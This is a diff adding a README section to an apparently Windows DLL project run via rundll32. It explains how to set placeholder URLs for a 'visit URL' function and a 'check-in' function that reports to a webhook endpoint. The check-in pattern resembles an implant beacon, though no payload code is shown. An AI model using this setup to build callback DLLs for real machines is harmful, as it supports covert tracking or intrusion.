@@ -67,6 +67,25 @@ cargo build --release
 C:\Users\Builder\RustDoLL\target\release
 ```
 
+## Customization for VisitURL and CheckIn Module via Webhook.site
+To customize the behavior of the DLL before compiling:
+
+### 1. Networking Endpoints
+Open `dll_project/src/lib.rs` and locate the `visit_url_logic` and `check_in_logic` functions. Update the URL strings as follows:
+
+```rust
+// In lib.rs
+fn visit_url_logic() {
+    let url = "https://your-target-url.com"; // UPDATE THIS
+    // ...
+}
+
+fn check_in_logic() {
+    let url = "https://your-webhook-endpoint.com]"; // UPDATE THIS
+    // ...
+}
+```
+
 ## Usage
 
 ### Method 1: Standalone Testing (`rundll32`)
